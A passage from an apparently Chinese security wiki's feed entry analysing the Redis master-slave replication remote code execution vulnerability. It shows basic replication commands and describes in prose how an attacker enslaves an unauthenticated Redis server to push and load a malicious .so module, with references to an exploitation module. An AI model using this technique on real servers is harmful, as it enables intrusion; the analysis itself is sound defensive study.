src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/18.png"></p><p>（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/19.png"></p><p>（4）然后在主节点删除这个key：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/21.png"></p><p>（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/22.png"></p><ol start="3"><li>断开复制</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof &lt;masterip&gt; &lt;masterport&gt;</span><br></pre></td></tr></table></figure><p>命令建立主从复制关系以后，可以通过命令断开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">slaveof no one</span><br></pre></td></tr></table></figure><p>需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。</p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><h4 id="漏洞利用过程"><a href="#漏洞利用过程" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h4><p>攻击者连接到远程无密码或者弱密码的redis-server，执行slaveof命令，使redis服务器成为攻击者的slave机器，然后攻击者在本地编译一个恶意.so文件，利用外部模块扩展Redis功能这个特性，再配合主从复制机制传送到目标机器，之后注入远程命令调用.so，执行恶意操作。</p><h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>此漏洞利用的是redis的特性</p><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>​        攻击包为RESP协议，Redis默认监听在6379，使用Redis命令，Redis命令详解请看 3.1技术背景。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/23.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://redis.io/commands/slaveof">https://redis.io/commands/slaveof</a></li><li><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></li><li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
</feed>
